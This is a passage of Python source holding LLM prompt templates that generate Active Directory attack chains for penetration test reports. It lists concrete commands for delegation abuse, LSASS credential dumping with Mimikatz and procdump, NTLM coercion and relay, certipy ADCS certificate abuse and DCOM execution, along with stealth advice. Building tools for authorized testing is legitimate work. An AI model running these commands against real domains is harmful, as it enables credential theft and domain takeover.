you can configure RBCD and impersonate any user to the target computer.

## ATTACK REQUIREMENTS
1. Write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
2. Control of a computer account (create one or compromise existing)
3. That computer account's credentials (for S4U operations)

## ATTACK FLOW
1. **Create/Compromise Computer Account** - Need a machine account we control
2. **Configure RBCD** - Set AllowedToAct pointing to our controlled account
3. **Request S4U2Self** - Get ticket for Admin to our controlled account
4. **Request S4U2Proxy** - Forward ticket to target computer
5. **Access Target** - Use ticket to access target as Administrator

## TOOLS TO USE
- **Machine Account Creation** (if MachineAccountQuota > 0):
  - impacket-addcomputer (Impacket)
  - New-MachineAccount (PowerMad)
- **RBCD Configuration**:
  - Set-DomainObject -Identity TARGET$ -Set @{{'msds-allowedtoactonbehalfofotheridentity'=$sd}}
  - impacket-rbcd (Impacket)
- **S4U Attack**:
  - Rubeus s4u /user:OURCOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET /ptt
  - impacket-getST -spn cifs/TARGET -impersonate Administrator DOMAIN/OURCOMPUTER$:password

## MACHINE ACCOUNT QUOTA
By default, domain users can create up to 10 computer accounts (ms-DS-MachineAccountQuota).
Check: Get-DomainObject -Identity "DC=domain,DC=com" -Properties ms-DS-MachineAccountQuota

## CRITICAL RULES
1. RBCD works on COMPUTERS, not users
2. You need to CONTROL a computer account (create or compromise)
3. Protected users (AdminSDHolder) may block impersonation
4. Do NOT mention DCSync - this is for computer compromise, not DC
5. The RBCD attack MUST have 4 separate steps — NEVER merge them:
   Step 1: Create attacker computer (impacket-addcomputer) — its own step
   Step 2: Configure RBCD delegation (impacket-rbcd) — its own step
   Step 3: Request service ticket (impacket-getST) — its own step
   Step 4: Use ticket for access (impacket-secretsdump or evil-winrm with -k) — its own step

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate exactly 4 steps covering the full RBCD attack. Each step MUST be separate."""


# =============================================================================
# UNCONSTRAINED DELEGATION PROMPT
# For: TrustedForDelegation edges
# =============================================================================
UNCONSTRAINED_DELEGATION_PROMPT = """You are generating an **Unconstrained Delegation** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: UNCONSTRAINED DELEGATION
Unconstrained Delegation (TrustedForDelegation) allows a computer to store
Kerberos TGTs of users who authenticate to it. An attacker who compromises
this computer can extract these TGTs and impersonate those users anywhere.

The prize target: **Domain Controller TGTs** - Coercing a DC to authenticate
to an Unconstrained Delegation system gives you DC's TGT = Domain Admin.

## ATTACK FLOW
1. **Compromise Unconstrained Delegation Host** - Get SYSTEM on the target computer
2. **Monitor for TGTs** - Use Rubeus to monitor incoming tickets
3. **Coerce Authentication** - Force high-value targets (DC) to authenticate
4. **Capture TGT** - Extract the TGT from memory
5. **Use TGT** - Pass-the-ticket for lateral movement

## COERCION TECHNIQUES
- **PrinterBug/SpoolService**:
  - SpoolSample.exe DC UNCONSTRAINED_HOST
  - printerbug.py DOMAIN/USER:PASS@DC UNCONSTRAINED_HOST
- **PetitPotam** (NTLM coercion, then relay):
  - petitpotam.py UNCONSTRAINED_HOST DC
- **DFSCoerce**:
  - dfscoerce.py -d DOMAIN -u USER -p PASS DC UNCONSTRAINED_HOST

## TOOLS TO USE
- **TGT Monitoring**: Rubeus monitor /interval:5 /nowrap
- **TGT Extraction**: Rubeus dump /nowrap
- **Pass-the-Ticket**: Rubeus ptt /ticket:BASE64_TICKET
- **Coercion**: SpoolSample, printerbug.py, PetitPotam

## CRITICAL RULES
1. You need SYSTEM on the Unconstrained Delegation computer first
2. Coercing a DC gives you Domain Admin (DC's TGT)
3. PrinterBug requires Spooler service running (often disabled on DCs)
4. Monitor for existing TGTs - users may already have authenticated

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering Unconstrained Delegation exploitation."""


# =============================================================================
# ADMIN TO / LOCAL ADMIN PROMPT
# For: AdminTo edges
# =============================================================================
ADMINTO_PROMPT = """You are generating a **Local Administrator** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: LOCAL ADMIN EXPLOITATION
AdminTo indicates the source principal has local administrator rights on the target computer.
This enables multiple attack vectors for lateral movement and credential harvesting.

## ATTACK TECHNIQUES

**1. Remote Code Execution**
- PsExec (service-based) - Creates and starts service on target
- WMI Execution - Uses Windows Management Instrumentation
- WinRM/PowerShell Remoting - Native PowerShell remote management
- DCOM Execution - Distributed COM objects

**2. Credential Harvesting**
- LSASS Memory Dump - Extract credentials from memory
- SAM/LSA Secrets - Local account hashes
- Token Impersonation - Steal logged-in user tokens

**3. Persistence**
- Create local admin account
- Registry run keys
- Scheduled tasks

## ATTACK FLOW
1. **Verify Admin Access** - Confirm local admin rights
2. **Choose Execution Method** - Based on OPSEC requirements
3. **Execute Remotely** - Get shell on target
4. **Harvest Credentials** - Extract from memory/registry
5. **Continue Laterally** - Use new credentials for next hop

## TOOLS TO USE
- **Remote Execution**:
  - impacket-psexec (Impacket) - May trigger AV, creates service
  - impacket-wmiexec (Impacket) - Semi-interactive, more stealthy
  - evil-winrm - WinRM shell, needs 5985/5986 open
  - impacket-atexec - Scheduled task execution
- **Credential Harvesting**:
  - Mimikatz sekurlsa::logonpasswords
  - pypykatz for remote LSASS dumping
  - impacket-secretsdump -sam -security (local secrets)

## DETECTION EVENTS
- Event 7045: Service creation (PsExec)
- Event 4624: Logon (Types 2, 3, 10)
- Event 4672: Special privileges assigned
- Event 4688: Process creation

## CRITICAL RULES
1. This is LATERAL MOVEMENT - you're expanding access
2. PsExec is noisy (service creation), WMI is quieter
3. Check for logged-in users (HasSession) for credential harvesting
4. LAPS may be deployed - need ReadLAPSPassword if so

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering local admin exploitation."""


# =============================================================================
# RDP ACCESS PROMPT
# For: CanRDP edges
# =============================================================================
CANRDP_PROMPT = """You are generating an **RDP Access** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: RDP EXPLOITATION
CanRDP indicates the source can establish Remote Desktop sessions to the target.
RDP provides full GUI access and is useful for interactive operations.

## ATTACK TECHNIQUES

**1. Standard RDP**
- Connect with valid credentials
- Interactive GUI access
- Useful for applications requiring GUI

**2. Pass-the-Hash RDP** (with Restricted Admin Mode)
- Use NTLM hash instead of password
- Requires Restricted Admin Mode enabled on target
- HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin = 0

**3. Credential Harvesting via RDP**
- If target has other logged-in sessions, may harvest credentials
- Token theft from other sessions

## TOOLS TO USE
- **RDP Clients**:
  - xfreerdp (Linux) - Supports pass-the-hash
  - rdesktop (Linux)
  - mstsc.exe (Windows native)
- **Pass-the-Hash RDP**:
  - xfreerdp /u:USER /pth:HASH /v:TARGET /restricted-admin
  - Requires Restricted Admin Mode enabled

## RDP SPECIFIC CONSIDERATIONS
- Port 3389 must be open
- Network Level Authentication (NLA) may require valid credentials upfront
- RDP creates visible session - may alert defenders
- Event 4624 Type 10 = RemoteInteractive logon

## CRITICAL RULES
1. RDP is VISIBLE - user may see "user logged on" notification
2. For stealth, prefer WMI/WinRM over RDP
3. Pass-the-Hash requires Restricted Admin Mode (often disabled)
4. Can use for credential harvesting if other users logged in

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering RDP access exploitation."""


# =============================================================================
# POWERSHELL REMOTING PROMPT
# For: CanPSRemote edges
# =============================================================================
CANPSREMOTE_PROMPT = """You are generating a **PowerShell Remoting** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: POWERSHELL REMOTING
CanPSRemote indicates the source can use PowerShell Remoting (WinRM) to the target.
This provides command execution without GUI, useful for automation and stealth.

## ATTACK TECHNIQUES

**1. Interactive Session**
- Enter-PSSession for interactive PowerShell
- Full PowerShell environment

**2. Remote Command Execution**
- Invoke-Command for running scripts/commands
- Can target multiple hosts simultaneously

**3. Tool Loading**
- Load offensive tools in-memory
- Execute Mimikatz, PowerView, etc.

## TOOLS TO USE
- **Native PowerShell**:
  - Enter-PSSession -ComputerName TARGET -Credential CRED
  - Invoke-Command -ComputerName TARGET -ScriptBlock {{ }}
  - New-PSSession for persistent sessions
- **Third-Party**:
  - evil-winrm - Feature-rich WinRM client
  - nxc smb TARGET -x "command" (NetExec for command execution)

## WINRM REQUIREMENTS
- Port 5985 (HTTP) or 5986 (HTTPS) must be open
- User must be in Remote Management Users or Administrators
- WinRM service must be running

## CRITICAL RULES
1. WinRM is STEALTHIER than PsExec - no service creation
2. Script block logging may capture commands (Event 4104)
3. Can load tools in-memory to avoid disk forensics
4. Requires local admin OR Remote Management Users membership

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering PowerShell Remoting exploitation."""


# =============================================================================
# LAPS PASSWORD READ PROMPT
# For: ReadLAPSPassword edges
# =============================================================================
READLAPS_PROMPT = """You are generating a **LAPS Password Read** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: LAPS EXPLOITATION
LAPS (Local Administrator Password Solution) stores unique local admin passwords
in Active Directory. The password is stored in ms-Mcs-AdmPwd (or newer msLAPS-Password)
attribute on computer objects. ReadLAPSPassword indicates read access to this attribute.

## ATTACK FLOW
1. **Verify Read Access** - Confirm LAPS read permissions
2. **Read LAPS Password** - Query AD for the password attribute
3. **Authenticate Locally** - Use password for local admin access
4. **Execute on Target** - Get shell on target computer
5. **Harvest Credentials** - Domain credentials from memory

## TOOLS TO USE
- **Read LAPS Password**:
  - Get-DomainComputer TARGET -Properties ms-mcs-admpwd (PowerView)
  - Get-ADComputer TARGET -Properties ms-mcs-admpwd (RSAT)
  - nxc ldap {dc_hostname} -u USER -p PASS --laps (NetExec)
  - laps.py - Direct LAPS password retrieval
- **Use Password**:
  - impacket-psexec ./Administrator:LAPS_PASSWORD@TARGET
  - evil-winrm -i TARGET -u Administrator -p 'LAPS_PASSWORD'

## LAPS VERSIONS
- **Legacy LAPS**: ms-Mcs-AdmPwd attribute
- **Windows LAPS** (newer): msLAPS-Password, msLAPS-EncryptedPassword

## CRITICAL RULES
1. LAPS password is for LOCAL admin, not domain admin
2. Password may rotate on schedule - use immediately
3. Access to one LAPS password != access to all computers
4. LAPS is OPSEC-SAFE to read - normal admin activity

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering LAPS password exploitation."""


# =============================================================================
# GMSA PASSWORD READ PROMPT
# For: ReadGMSAPassword edges
# =============================================================================
READGMSA_PROMPT = """You are generating a **gMSA Password Read** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: GMSA EXPLOITATION
Group Managed Service Accounts (gMSA) have passwords managed by AD. The password
is stored in msDS-ManagedPassword attribute and can be read by principals in
msDS-GroupMSAMembership. ReadGMSAPassword indicates ability to read this password.

## ATTACK FLOW
1. **Compromise Authorized Principal** - Get access to account with gMSA read rights
2. **Read gMSA Password** - Extract the managed password blob
3. **Calculate NT Hash** - Convert password blob to usable hash
4. **Authenticate as gMSA** - Use hash for Kerberos/NTLM auth
5. **Abuse gMSA Privileges** - Service accounts often have elevated rights

## TOOLS TO USE
- **Read gMSA Password**:
  - GMSAPasswordReader.exe (Compiled)
  - gMSADumper.py
  - Get-ADServiceAccount -Identity gMSA$ -Properties msDS-ManagedPassword
- **Convert to Hash**:
  - DSInternals ConvertFrom-ADManagedPasswordBlob
  - gMSADumper.py calculates automatically
- **Use Hash**:
  - Pass-the-Hash with gMSA account
  - impacket-psexec, impacket-wmiexec with -hashes

## CRITICAL RULES
1. gMSA passwords are 256 characters, auto-rotated
2. You get the HASH, not cleartext password
3. Service accounts often have excessive privileges
4. gMSA may have local admin on multiple servers

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering gMSA exploitation."""


# =============================================================================
# SHADOW CREDENTIALS PROMPT
# For: AddKeyCredentialLink edges
# =============================================================================
SHADOWCREDS_PROMPT = """You are generating a **Shadow Credentials** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: SHADOW CREDENTIALS
Shadow Credentials abuse the msDS-KeyCredentialLink attribute to add a certificate-based
credential to a target object. This allows authentication via PKINIT without knowing
the target's password. Requires AD 2016+ with Key Trust model.

## ATTACK FLOW
1. **Verify Write Access** - Confirm ability to write msDS-KeyCredentialLink
2. **Generate Key Pair** - Create certificate for authentication
3. **Add Shadow Credential** - Write key to target's msDS-KeyCredentialLink
4. **Request TGT via PKINIT** - Authenticate with the certificate
5. **Access as Target** - Now you are the target user/computer

## TOOLS TO USE
- **Add Shadow Credential**:
  - Whisker.exe add /target:TARGET /domain:DOMAIN /dc:DC
  - pywhisker.py -d DOMAIN -u USER -p PASS --target TARGET --action add
  - certipy shadow (Certipy)
- **Authenticate**:
  - Rubeus asktgt /user:TARGET /certificate:cert.pfx /password:pass /ptt
  - Certipy auth -pfx cert.pfx
- **UnPAC-the-Hash** (get NT hash from TGT):
  - Rubeus asktgt /getcredentials

## REQUIREMENTS
- AD 2016+ functional level
- PKINIT enabled (usually default)
- Write access to msDS-KeyCredentialLink
- Target must not have existing legitimate key credentials (or append)

## CRITICAL RULES
1. Shadow Credentials is STEALTHIER than password reset
2. Does NOT change the target's password
3. Generates Event 5136 (attribute modification)
4. Clean up after: remove the added key credential

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering Shadow Credentials attack."""


# =============================================================================
# FORCE PASSWORD CHANGE PROMPT
# For: ForceChangePassword edges
# =============================================================================
FORCEPASSWORD_PROMPT = """You are generating a **Force Password Change** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: PASSWORD RESET ATTACK
ForceChangePassword allows resetting a user's password WITHOUT knowing the current password.
This is the most direct account takeover - but also the most disruptive and detectable.

## ATTACK FLOW
1. **Compromise Source** - Get access to principal with password reset rights
2. **Reset Target Password** - Set new password for target
3. **Authenticate as Target** - Login with the new password
4. **Abuse Target Privileges** - Use target's permissions
5. **Consider Cleanup** - Target will know when they try to login

## TOOLS TO USE
- **Password Reset (LDAP-based — required for ForceChangePassword ACL right)**:
  - Set-ADAccountPassword -Identity TARGET -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
  - bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC set password TARGET 'NewPass123!'
  - rpcclient -U USER //DC -c "setuserinfo2 TARGET 23 'NewPass123!'"
  - **NEVER use `net user TARGET /domain`** — it uses SAMR protocol which requires local admin on DC, NOT the ForceChangePassword ACL right. SAMR will fail with "System error 5" (access denied).
- **Authenticate**:
  - evil-winrm, impacket-psexec, impacket-wmiexec with new credentials

## DETECTION EVENTS
- Event 4724: Password reset attempt
- Event 4723: Password change (user-initiated)
- Help desk may receive lockout/access calls

## OPSEC CONSIDERATIONS
- **NOISY**: User will notice they can't log in
- **DETECTABLE**: Password reset events are logged
- Consider Shadow Credentials or Targeted Kerberoasting for stealth
- If used, do it FAST and extract credentials before target notices

## CRITICAL RULES
1. This is DESTRUCTIVE - target user loses access
2. Use only if stealth is not required
3. Better alternatives: Shadow Credentials, Targeted Kerberoasting
4. Reset to something strong - weak password may trigger policy alerts

## TECHNIQUE RESTRICTIONS (MANDATORY)
❌ Do NOT include DCSync, Golden Ticket, secretsdump, or krbtgt in this attack chain
❌ Password reset doesn't grant directory replication rights
✅ Final step: Use the reset password for lateral movement (RDP, WinRM, SMB)
✅ Focus on: Reset password → authenticate as target → access target's resources

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering password reset attack."""


# =============================================================================
# ADD MEMBER PROMPT
# For: AddMember, AddSelf edges
# =============================================================================
ADDMEMBER_PROMPT = """You are generating a **Group Membership Manipulation** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: GROUP MANIPULATION
AddMember/AddSelf allows adding principals to a security group. By adding yourself
(or a controlled account) to a privileged group, you inherit all of that group's
permissions immediately.

## ATTACK FLOW
1. **Compromise Source** - Get access to principal with AddMember rights
2. **Identify Group Value** - What does group membership grant?
3. **Add to Group** - Add controlled account as member
4. **Refresh Tickets** - Get new TGT with updated group membership
5. **Abuse New Rights** - Exercise inherited permissions

## TOOLS TO USE
- **Add to Group**:
  - Add-DomainGroupMember -Identity 'TARGET_GROUP' -Members 'CONTROLLED_USER' (PowerView)
  - net group "TARGET_GROUP" CONTROLLED_USER /add /domain
  - Add-ADGroupMember -Identity 'TARGET_GROUP' -Members 'CONTROLLED_USER' (RSAT)
- **Refresh Kerberos Ticket**:
  - klist purge (clear cached tickets)
  - Log out and log back in
  - Rubeus tgtdeleg (get fresh TGT)

## TARGET GROUPS (High Value)
- Domain Admins - Full domain control
- Enterprise Admins - Forest-wide control
- Administrators - DC local admin
- Account Operators - Can manage non-admin users
- Backup Operators - Can backup DC (DCSync alternative)
- Server Operators - Can run services on DC

## CRITICAL RULES
1. Group membership is VISIBLE - appears in BloodHound, audits
2. Requires ticket refresh to use new membership
3. Adding to Domain Admins grants significant privileges
4. Event 4728/4732 logs group additions

## TECHNIQUE RESTRICTIONS (MANDATORY)
❌ Do NOT include DCSync, Golden Ticket, secretsdump, or krbtgt in this attack chain
❌ Do NOT suggest "dump krbtgt hash" or "create Golden Ticket" as a next step
✅ Final step: Show USING the new group privileges (AdminTo access, resource access)
✅ Focus on: Add to group → refresh ticket → access resources with new privileges

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering group membership manipulation."""


# =============================================================================
# HAS SESSION PROMPT
# For: HasSession edges
# =============================================================================
HASSESSION_PROMPT = """You are generating a **Session Credential Harvesting** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: SESSION EXPLOITATION
HasSession indicates a user has an active logon session on the target computer.
If you have admin access to that computer, you can harvest their credentials from memory.
This is DERIVATIVE credential access - you're stealing someone else's already-authenticated session.

## ATTACK FLOW
1. **Get Admin on Computer** - Must have local admin rights first
2. **Check Active Sessions** - Verify target user is logged in
3. **Dump LSASS Memory** - Extract credentials from memory
4. **Identify Credentials** - Find target user's password/hash
5. **Use Harvested Credentials** - Authenticate as the target user

## TOOLS TO USE
- **Session Enumeration**:
  - query user (on target)
  - qwinsta (query sessions)
  - Get-NetLoggedon (PowerView)
- **Credential Harvesting**:
  - Mimikatz sekurlsa::logonpasswords (requires SYSTEM/admin)
  - Mimikatz sekurlsa::msv (NTLM hashes)
  - pypykatz lsa minidump (offline analysis)
  - procdump -ma lsass.exe (dump for offline)
- **Token Impersonation**:
  - Incognito list_tokens -u
  - Incognito impersonate_token "DOMAIN\\USER"

## PREREQUISITES
- LOCAL ADMIN on the computer with the session
- Target user must have ACTIVE session (not just cached creds)
- Credential Guard may protect some credentials

## CRITICAL RULES
1. You MUST have admin on the session computer first
2. Credential Guard protects some credentials on modern systems
3. Protected Process Light (PPL) for LSASS blocks Mimikatz - need to bypass
4. Token impersonation doesn't require password - just active session

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate only the steps that are genuinely needed (typically 2-4) covering session credential harvesting."""


# =============================================================================
# ADCS ESC1 PROMPT
# For: ADCSESC1 edges
# =============================================================================
ADCS_ESC1_PROMPT = """You are generating an **ADCS ESC1** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: ESC1 - MISCONFIGURED CERTIFICATE TEMPLATE
ESC1 occurs when a certificate template allows low-privileged users to request
certificates with arbitrary SANs (Subject Alternative Names). This allows
requesting a certificate as ANY user (including Domain Admin).

## VULNERABLE CONDITIONS
- Template allows enrollment for low-privileged users
- ENROLLEE_SUPPLIES_SUBJECT flag enabled
- Client Authentication or Smart Card Logon EKU
- Manager approval NOT required

## ATTACK FLOW
1. **Enumerate Vulnerable Templates** - Find ESC1 misconfiguration
2. **Request Certificate as Admin** - Specify admin UPN in SAN
3. **Authenticate via PKINIT** - Use certificate for Kerberos auth
4. **Access as Domain Admin** - Now authenticated as target user
5. **Optional: DCSync** - With DA rights, dump all hashes

## TOOLS TO USE (use hostnames from {domain})
- **Enumeration**:
  - certipy find -u USER -p PASS -dc-ip {dc_hostname} -stdout -vulnerable
  - Certify.exe find /vulnerable
- **Request Certificate** (template: {target}):
  - certipy req -u USER -p PASS -target CA.{domain} -template '{target}' -upn administrator@{domain} -ca CA_NAME
  - Certify.exe request /ca:CA /template:'{target}' /altname:administrator
- **Authenticate**:
  - certipy auth -pfx admin.pfx -dc-ip {dc_hostname}
  - Rubeus asktgt /user:administrator /certificate:cert.pfx /ptt

## CRITICAL RULES
1. ESC1 = Instant Domain Admin if exploitable
2. Requires enrollment rights on vulnerable template
3. Uses PKINIT for authentication - not password-based
4. Certificate persists even if password changes

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering ESC1 exploitation to domain compromise."""


# =============================================================================
# ADCS ESC4 PROMPT
# For: ADCSESC4 edges
# =============================================================================
ADCS_ESC4_PROMPT = """You are generating an **ADCS ESC4** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: ESC4 - VULNERABLE CERTIFICATE TEMPLATE ACL
ESC4 occurs when you have write access to a certificate template object.
You can MODIFY the template to add ESC1-style vulnerabilities, then exploit it.

## ATTACK FLOW
1. **Verify Write Access** - Confirm ACL abuse on template object
2. **Backup Original Template** - Save current configuration
3. **Modify Template** - Add ENROLLEE_SUPPLIES_SUBJECT, enrollment rights
4. **Exploit as ESC1** - Request certificate as Domain Admin
5. **Restore Template** - Return to original state for stealth

## TOOLS TO USE (template: {target})
- **Template Modification**:
  - certipy template -u USER -p PASS -template '{target}' -save-old
  - certipy template -u USER -p PASS -template '{target}' -configuration ESC1
  - modifyCertTemplate.py
- **Exploitation** (same as ESC1):
  - certipy req -u USER -p PASS -target CA -template '{target}' -upn administrator@{domain}
  - certipy auth -pfx admin.pfx -dc-ip {dc_hostname}
- **Cleanup**:
  - certipy template -u USER -p PASS -template '{target}' -configuration original.json

## CRITICAL RULES
1. ESC4 requires WRITE access to template, not just enrollment
2. Modify → Exploit → Restore for stealth
3. Template changes may require time to propagate
4. Generates AD audit events on template modification

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering ESC4 exploitation."""


# =============================================================================
# ADCS ESC8 PROMPT
# For: ADCSESC8 edges
# =============================================================================
ADCS_ESC8_PROMPT = """You are generating an **ADCS ESC8** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: ESC8 - NTLM RELAY TO AD CS HTTP ENDPOINT
ESC8 exploits the web enrollment interface of AD CS. If NTLM authentication is
enabled and EPA is not enforced, you can relay NTLM authentication to the CA
web service to request certificates as the relayed user.

## ATTACK FLOW
1. **Verify HTTP Enrollment** - Check CA has web enrollment enabled
2. **Set Up Relay** - Configure ntlmrelayx to target CA web interface
3. **Coerce Authentication** - Force high-value target (DC) to authenticate
4. **Relay to CA** - NTLM relay obtains certificate as coerced user
5. **Authenticate** - Use certificate for PKINIT authentication

## TOOLS TO USE (use hostnames from {domain})
- **Relay Setup**:
  - ntlmrelayx.py -t http://CA.{domain}/certsrv/certfnsh.asp -smb2support --adcs --template TEMPLATE
- **Coercion**:
  - PetitPotam.py ATTACKER_LISTENER {dc_hostname} (EfsRpcOpenFileRaw)
  - printerbug.py {domain}/USER:PASS@{dc_hostname} ATTACKER_LISTENER
  - dfscoerce.py {domain}/USER:PASS@{dc_hostname} ATTACKER_LISTENER
- **Authentication**:
  - Certipy auth -pfx dc.pfx -dc-ip {dc_hostname}
  - Rubeus asktgt /user:DC$ /certificate:dc.pfx

## PREREQUISITES
- CA with web enrollment (HTTP at /certsrv)
- NTLM authentication allowed on CA web interface
- No Extended Protection for Authentication (EPA)
- Ability to coerce high-value target

## CRITICAL RULES
1. ESC8 is a RELAY attack - need network position
2. Coercing DC machine account = DCSync equivalent
3. Certificate obtained is for the COERCED user, not attacker
4. Some DCs have Print Spooler disabled - try PetitPotam

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering ESC8 relay attack."""


# =============================================================================
# GENERIC ADCS PROMPT (for ESC2, ESC3, ESC5-7, ESC9-15)
# =============================================================================
ADCS_GENERIC_PROMPT = """You are generating an **ADCS Certificate Attack** chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: AD CERTIFICATE SERVICES ABUSE
AD CS (Active Directory Certificate Services) can be abused through various ESC
(Escalation) techniques. This finding indicates a certificate-based privilege
escalation path.

## ESC TECHNIQUE REFERENCE
- **ESC1**: User-supplied SAN in certificate request
- **ESC2**: Any Purpose EKU or no EKU restriction
- **ESC3**: Certificate request agent template
- **ESC4**: Write access to certificate template
- **ESC5**: Write access to CA configuration
- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
- **ESC7**: CA has vulnerable permissions
- **ESC8**: NTLM relay to AD CS web enrollment
- **ESC9-15**: Various newer escalation techniques

## TOOLS TO USE (use hostnames from {domain})
- **Enumeration**:
  - Certipy find -u USER -p PASS -dc-ip {dc_hostname} -vulnerable
  - Certify.exe find /vulnerable
- **Request Certificate**:
  - Certipy req -u USER -p PASS -target CA.{domain} -template TEMPLATE
  - Certify.exe request /ca:CA /template:TEMPLATE
- **Authenticate**:
  - Certipy auth -pfx cert.pfx -dc-ip {dc_hostname}
  - Rubeus asktgt /user:TARGET /certificate:cert.pfx /ptt

## CRITICAL RULES
1. ADCS attacks provide PERSISTENT access (certs outlive password changes)
2. Certificate authentication uses PKINIT - Kerberos-based
3. UnPAC-the-hash can extract NTLM hash from certificate auth
4. Check specific ESC type for exact exploitation technique

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 4-5 steps covering this ADCS exploitation path."""


# =============================================================================
# SID HISTORY PROMPT
# For: HasSIDHistory edges
# =============================================================================
SIDHISTORY_PROMPT = """You are generating a **SID History** abuse chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: SID HISTORY EXPLOITATION
SID History is designed for migration scenarios, allowing a user to maintain access
to resources from a previous domain. If an account has Domain Admin SID in its
SID History, it effectively HAS Domain Admin privileges.

## ATTACK SCENARIOS

**1. Existing SID History Abuse**
- Account already has privileged SID in history
- No action needed - just use the account

**2. SID History Injection**
- Requires write access to user object AND mimikatz at DC level
- Inject DA SID into user's SID History
- Mimikatz sid::patch + sid::add

## TOOLS TO USE
- **Enumerate SID History**:
  - Get-DomainUser -Properties sidhistory (PowerView)
  - Get-ADUser USER -Properties SIDHistory
- **SID History Injection** (requires DC access):
  - mimikatz "sid::patch" "sid::add /sam:USER /new:S-1-5-21-...-512"
- **Use Privileges**:
  - Normal domain operations as the user

## CRITICAL RULES
1. SID History is evaluated in access tokens
2. DA SID in history = actual DA privileges
3. Injection requires MIMIKATZ on DC (advanced)
4. Often found in migrated environments

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering SID History abuse."""


# =============================================================================
# DCOM EXECUTION PROMPT
# For: ExecuteDCOM edges
# =============================================================================
EXECUTEDCOM_PROMPT = """You are generating a **DCOM Execution** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: DCOM REMOTE CODE EXECUTION
DCOM (Distributed Component Object Model) allows instantiating COM objects on remote
machines and calling their methods. Several COM objects can execute commands, providing
an alternative lateral movement technique to PsExec/WMI.

## POPULAR DCOM OBJECTS FOR EXECUTION
- **MMC20.Application** (ProgID: MMC20.Application)
  - Method: Document.ActiveView.ExecuteShellCommand()
- **ShellWindows** (ProgID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39})
  - Method: Item().Document.Application.ShellExecute()
- **ShellBrowserWindow**
  - Method: Document.Application.ShellExecute()
- **Excel.Application** / **Outlook.Application**
  - Macro execution capabilities

## ATTACK FLOW
1. **Verify DCOM Access** - Check RPC connectivity and permissions
2. **Choose DCOM Object** - Select based on what's available
3. **Instantiate Remote Object** - Create COM object on target
4. **Execute Command** - Call execution method
5. **Establish Persistence** - Optional: deploy backdoor

## TOOLS TO USE
- **Invoke-DCOM** (PowerView):
  - Invoke-DCOM -ComputerName TARGET -Method MMC20.Application -Command "cmd.exe /c whoami"
- **impacket-dcomexec** (Impacket):
  - dcomexec.py DOMAIN/USER:PASSWORD@TARGET
- **PowerShell Native**:
  - $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))
  - $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami", "7")

## PORTS AND REQUIREMENTS
- Port 135 (RPC Endpoint Mapper)
- Dynamic high ports (ephemeral RPC)
- Local admin rights on target

## CRITICAL RULES
1. DCOM is QUIETER than PsExec - no service creation
2. Requires RPC connectivity (port 135 + high ports)
3. May not work through firewalls blocking RPC
4. Some EDRs now detect common DCOM abuse

{common_output_format}

{common_formatting_rules}

{common_opsec_rules}

{common_exclusions}

Generate 3-4 steps covering DCOM-based lateral movement."""


# =============================================================================
# SQL ADMIN PROMPT
# For: SQLAdmin edges
# =============================================================================
SQLADMIN_PROMPT = """You are generating a **SQL Server Exploitation** attack chain for a penetration test report.

{common_header}

{common_starting_position}

## ATTACK OVERVIEW: MSSQL ACCESS TO DOMAIN COMPROMISE
SQLAdmin or MSSQL access provides multiple paths to domain compromise.
